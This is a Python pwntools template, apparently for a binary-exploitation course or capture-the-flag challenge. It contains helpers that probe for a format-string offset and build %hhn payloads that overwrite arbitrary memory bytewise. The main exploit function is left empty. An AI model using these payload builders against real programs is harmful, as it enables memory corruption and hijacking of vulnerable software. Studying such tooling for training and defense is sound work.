#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 1234

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
break
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

        E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
### Format String Helper Functions ###
######################################

def find_offset(after = b':', option = 1):
    for i in range(1, 20):
        connect_binary()

        if option == 1:
            P.sendlineafter(after, f'AAAA%{i}$x'.encode())
            output = P.recvline(timeout=0.5).strip().decode('utf-8')
        else:
            P.sendlineafter(after, 'AAAABBBB %{}$x'.format(i)) # replace %x with %s to find the actual values
            P.recvuntil('AAAABBBB ')
            print('{}: {}'.format(i, P.recvline(timeout=0.5).strip().decode('utf-8')))

        with context.local(log_level='error'):
            P.close()

        if option == 1 and '41414141' in output:
            return i

def build_format_string(target, goal, start_byte=1, max_write=8):
    WRAP = 0x100

    bytes_list = [(goal >> (8 * i)) & 0xff for i in range(max_write)]
    writes = [(byte_value, index) for index, byte_value in enumerate(bytes_list)]
    writes.sort(key=lambda x: x[0])

    payload = b''
    written = 0 

    for idx, (byte_value, i) in enumerate(writes):
        to_write = (byte_value - written) % WRAP
        if to_write > 0:
            payload += f"%{to_write}c".encode()
            written += to_write
        param_index = start_byte + idx
        payload += f"%{param_index}$hhn".encode()

    padding = b'A' * ((8 - (len(payload) % 8)) % 8)
    payload += padding

    for _, i in writes:
        payload += p64(target + i)

    return payload

######################################
############## Exploit ###############
######################################

def exploit():
    ### Write exploit here...
    P.interactive()

if __name__ == '__main__':
    exploit()